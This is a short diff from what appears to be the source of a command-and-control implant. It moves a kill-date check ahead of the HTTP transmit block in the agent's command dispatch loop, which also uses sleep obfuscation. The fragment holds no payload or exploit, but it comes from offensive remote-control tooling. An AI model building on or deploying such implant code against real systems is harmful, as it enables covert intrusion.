@@ -68,18 +68,18 @@ VOID CommandDispatcher( VOID )
 
         SleepObf();
 
+        if ( Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate )
+        {
+            PackageDestroy( Package );
+            ReachedKillDate();
+        }
+
 #ifdef TRANSPORT_HTTP
         /* Send our buffer. */
         if ( ! PackageTransmit( Package, &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
         {
             PackageDestroy( Package );
             CommandExit( NULL );
-        }
-
-        if ( Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate )
-        {
-            PackageDestroy( Package );
-            ReachedKillDate();
         }
 
 /* SMB */
